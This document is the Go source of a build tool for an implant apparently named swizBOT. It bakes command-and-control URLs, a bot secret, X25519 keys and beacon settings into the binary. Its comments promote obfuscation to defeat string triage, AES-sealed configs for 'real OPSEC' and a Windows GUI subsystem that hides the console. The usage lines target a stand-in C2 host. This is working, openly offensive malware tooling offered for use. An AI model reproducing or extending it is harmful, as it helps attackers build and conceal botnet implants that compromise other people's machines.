// Command build bakes implant configuration into the binary at compile
// time, so field deployment is one command instead of an env-var bundle.
//
// The values are packed into a single opaque token (see internal/bakepack)
// and injected with `-ldflags -X main.bakedBundle=...`. Runtime env vars
// still win when set (env > baked > built-in default).
//
// Two bake modes:
//
//	default      obfuscated (b1): secrets are not recoverable with `strings`
//	             on the binary, but this is obfuscation, not encryption.
//	-seal PASS   sealed (b2): AES-256-GCM under a passphrase; the binary is
//	             inert without SWIZ_UNLOCK at runtime (true zero-leak build).
//
// Usage:
//
//	# obfuscated bake (good enough to defeat string triage)
//	go run ./cmd/build -c2-urls https://c2.example.com:8443 \
//	  -bot-secret s3cret -bot-key <implant-x25519-hex> \
//	  -c2-pubkey <operator-x25519-pub-hex> -os windows -arch amd64 -gui
//
//	# sealed bake (recommended for real OPSEC; needs SWIZ_UNLOCK at runtime)
//	go run ./cmd/build -seal 'correct horse battery staple' \
//	  -c2-urls https://c2.example.com:8443 -bot-secret s3cret \
//	  -bot-key <implant-x25519-hex> -c2-pubkey <operator-x25519-pub-hex>
package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/saviorSEC/swizBOT/internal/bakepack"
)

func main() {
	var (
		c2URLs    = flag.String("c2-urls", "", "comma-separated C2 endpoints (baked default)")
		botSecret = flag.String("bot-secret", "", "X-Bot-Secret value")
		botKey    = flag.String("bot-key", "", "implant X25519 private key (hex)")
		c2PubKey  = flag.String("c2-pubkey", "", "operator X25519 public key (hex)")
		xorHex    = flag.String("xor", "", "result obfuscation byte (hex)")
		interval  = flag.String("interval", "", "beacon interval (Go duration, e.g. 45s)")
		botID     = flag.String("bot-id", "", "fixed bot id (default hostname_pid)")
		seal      = flag.String("seal", "", "seal the baked config with this passphrase (required at runtime as SWIZ_UNLOCK)")
		goos      = flag.String("os", runtime.GOOS, "target OS")
		goarch    = flag.String("arch", runtime.GOARCH, "target arch")
		gui       = flag.Bool("gui", false, "windowsgui subsystem (Windows targets)")
		output    = flag.String("out", "", "output path (default bin/swizbot-bot[-.exe])")
		verbose   = flag.Bool("v", false, "print the go build command")
	)
	flag.Parse()

	// assemble the baked config bundle
	values := map[string]string{
		"c2_urls":    *c2URLs,
		"bot_secret": *botSecret,
		"bot_key":    *botKey,
		"op_pubkey":  *c2PubKey,
		"xor":        *xorHex,
		"interval":   *interval,
		"bot_id":     *botID,
	}
	token, err := bakepack.Pack(values, *seal)
	if err != nil {
		fmt.Fprintf(os.Stderr, "nothing to bake: %v\n", err)
		os.Exit(2)
	}

	if *seal == "" && (*botSecret != "" || *botKey != "") {
		fmt.Fprintln(os.Stderr, "warning: baking secrets WITHOUT -seal (obfuscated only).")
		fmt.Fprintln(os.Stderr, "         Use -seal <passphrase> for a zero-leak build that needs SWIZ_UNLOCK at runtime.")
	}

	ldflags := "-s -w -X main.bakedBundle=" + token
	if *gui && *goos == "windows" {
		ldflags += " -H=windowsgui"
	}

	out := *output
	if out == "" {
		out = "bin/swizbot-bot"
		if *goos == "windows" {
			out += ".exe"
		}
	}
	os.MkdirAll(filepath.Dir(out), 0o755)

	cmd := exec.Command("go", "build",
		"-ldflags", ldflags,
		"-o", out, "./cmd/bot")
	cmd.Env = append(os.Environ(),
		"GOOS="+*goos,
		"GOARCH="+*goarch,
		"CGO_ENABLED=0",
	)
	if *verbose {
		fmt.Println(cmd.String())
	}
	if b, err := cmd.CombinedOutput(); err != nil {
		fmt.Fprintf(os.Stderr, "build failed: %v\n%s", err, b)
		os.Exit(1)
	}
	mode := "obfuscated"
	if bakepack.IsSealed(token) {
		mode = "sealed"
	}
	fmt.Printf("built %s (%s/%s, %s config, %d bytes token)\n", out, *goos, *goarch, mode, len(token))
	_ = strings.TrimSpace // keep strings import stable across edits
}
